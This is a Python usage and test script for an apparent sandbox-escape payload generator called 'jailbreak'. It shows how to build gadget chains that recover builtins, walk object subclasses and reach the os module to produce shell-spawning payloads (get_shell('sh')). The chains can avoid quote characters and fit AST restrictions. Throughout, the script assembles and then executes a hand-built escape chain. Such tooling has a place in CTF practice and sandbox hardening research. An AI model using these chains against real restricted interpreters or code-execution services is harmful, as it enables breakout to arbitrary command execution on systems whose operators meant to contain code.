import ast
import jailbreak

#example usage for accessing specific gadget as current python code
from jailbreak.gadgets.python import builtins_dict
print(builtins_dict.builtins_dict__gi_builtins)

#example usage for gadget chains with the terminating gadget requiring parameters
payload = jailbreak.get_obj_dict("type(dict)")
print(payload)

print("\n---------\n")

#example usage for gadget chains with multi dependencies, and setting restrictions
jailbreak.config(provided=['type'], ast=[ast.GeneratorExp])
payload = jailbreak.builtins_dict()
print(payload)

print("\n---------\n")

#example usage for gadget chains that require converters to run (strless)
jailbreak.config(provided=['sys'], char='\'"')
payload = jailbreak.os()
print(payload)
assert all(c not in payload for c in '\'"')

print("\n---------\n")

#same as above, but inlined
jailbreak.config(inline=True, provided=['sys'], char='\'"')
payload = jailbreak.os()
print(payload)
assert all(c not in payload for c in '\'"')

print("\n---------\n")

#example platform specific requirements usage
jailbreak.config(platforms=["linux"], versions=[12], banned=['get_shell__os_system']) #force it to use platform specific gadgets

payload = jailbreak.get_shell("'ls'")
print(payload)

print("\n---------\n")

#example get shell full chain with user gadget
def os__user():
    import os
    return os

#reset config so jail requires the use of os__user
jailbreak.config(char='\'"', ast=[ast.ListComp])
#provide sys gadget
jailbreak.register_user_gadget(os__user, 'python')

payload = jailbreak.get_shell("'sh'")
print(payload)
# exec(payload, {'__builtins__': {"os": __import__("os"))}})

print("\n---------\n")

#example user gadget as last in chain
def ls__user(*, get_shell):
    return get_shell('ls')

jailbreak.register_user_gadget(ls__user, 'python')

payload = jailbreak.ls()  #ls does not exist in repo gadgets, but is provided by user
print(payload)

print("\n---------\n")

#inliner tests
def range__user(*, builtins_dict):
    return builtins_dict['range']

#calls inside nested scopes (get_shell), with calls outside of the inner scope but inside the same ast node (range)
def test_nested_noargs__user(*, range, get_shell):
    get_shell('outside')
    for i in range(100):
        get_shell('inside')

#same as above, except inliner is called on the calls outside of the inner scope
def test_nested_args__user(*, chr, get_shell):
    for i in chr(0x20) + chr(0x21):
        get_shell('inside')

#orelse/finally block test
def test_other_stmt_blocks__user(*, get_shell):
    try:
        get_shell('try')
    except:
        get_shell('except')
    #else is intentionally missed to test if it breaks on empty statement blocks; the same code is used for all statement blocks anyway
    finally:
        get_shell('finally')

jailbreak.config(inline=True)
jailbreak.register_user_gadget(range__user, 'python')
jailbreak.register_user_gadget(test_nested_noargs__user, 'python')
jailbreak.register_user_gadget(test_nested_args__user, 'python')
jailbreak.register_user_gadget(test_other_stmt_blocks__user, 'python')
payload = jailbreak.test_nested_noargs()
print(payload + '\n')
payload = jailbreak.test_nested_args()
print(payload + '\n')
payload = jailbreak.test_other_stmt_blocks()
print(payload)

print("\n---------\n")

#cleaner test
from jailbreak.utils.cleaner import cleaner
print(cleaner(
"""
import sys as haha
import builtins

test = 1
test2 = test

a, b = "scope", "no overwrite"

print(haha.argv)

with open(__file__) as f:
    def haha(a, b):
        test = 2
        what = 'hm'
        try:
            for i in range(10):
                builtins.print(i, a, b, test)
        except Exception as what:
            print(what)
        print(what)
        return 3

print(haha(test, test2))
print(a, b, f)
""", in_scope=['range', 'print', 'open', 'Exception', '__file__']))

print("\n---------\n")

#
# model specification usage examples
#
from jailbreak.models import *

#generate a small example with converters
jailbreak.config(provided=['os'], char='\'"')
gadget = jailbreak.ls

#prints the specification
print(gadget)

#call it to get the payload
gadget_payload = gadget()   
print(gadget_payload)

#directly copied from the specification printed above
static_gadget = PythonGadget(
    name="ls__user",
    dependencies=[
        PythonGadget(
            name="get_shell__os_system",
            dependencies=[
                PythonGadget(name="os", dependencies=[], dummy=True, converters=[])
            ],
            dummy=False,
            converters=[],
        )
    ],
    dummy=False,
    converters=[
        PythonConverter(
            name="strless__chr",
            dependencies=[
                PythonGadget(
                    name="chr__builtins",
                    dependencies=[
                        PythonGadget(
                            name="builtins_dict__gi_builtins",
                            dependencies=[],
                            dummy=False,
                            converters=[],
                        )
                    ],
                    dummy=False,
                    converters=[
                        PythonConverter(
                            name="strless__chr",
                            dependencies=[
                                PythonGadget(
                                    name="chr__bytes",
                                    dependencies=[
                                        PythonGadget(
                                            name="bytes__gen",
                                            dependencies=[
                                                PythonGadget(
                                                    name="type__class",
                                                    dependencies=[],
                                                    dummy=False,
                                                    converters=[],
                                                )
                                            ],
                                            dummy=False,
                                            converters=[],
                                        )
                                    ],
                                    dummy=False,
                                    converters=[],
                                )
                            ],
                            dummy=False,
                        )
                    ],
                )
            ],
            dummy=False,
        )
    ],
)

#they should generate the same payload
#(the payload might actually change from above as new gadgets are added, but both should work)
print(static_gadget())

def str__user_builtin(*, builtins_dict):
    return builtins_dict['str']
def obj__user_builtin(*, builtins_dict):
    return builtins_dict['object']

jailbreak.register_user_gadget(str__user_builtin, 'python')
jailbreak.register_user_gadget(obj__user_builtin, 'python')

#generate a payload from a handmade chain

#can cache converters for reuse in multiple parts of the chain
strless_converter = PythonConverter(
    name='strless__chr',
    dependencies=[
        #partial inline works as long as the whole chain is inlined
        PythonGadgetInline(name='chr__bytes', dependencies=[PythonGadgetInline(name='bytes__gen', dependencies=[PythonGadgetInline(name='type__class')])])
    ]
)

#gadgets also can be cached
builtins_gadget = PythonGadget(name='builtins_dict__gi_builtins')

#chain cherry picked to be small
manual_chain = PythonGadget(
    name='os__sys', 
    dependencies=[
        PythonGadget(
            name='sys__wrap_close',
            dependencies=[            
                #can use user gadgets   
                PythonGadget(
                    name='str__user_builtin', 
                    dependencies=[builtins_gadget],
                    converters=[strless_converter]
                ),
                PythonGadget(
                    name='list_classes__obj_subclass', 
                    dependencies=[PythonGadget(name='obj__user_builtin', dependencies=[builtins_gadget], converters=[strless_converter])]
                )
            ],
            #can use converters
            converters=[strless_converter]
        )
    ]
    #can partially apply converters (e.g. this gadget has a string in it but strless can be skipped on this)
)

print(manual_chain)
manual_payload = manual_chain()
print(manual_payload)

#generate chain works
env = {}
exec(manual_payload, env)
print(env['os'])
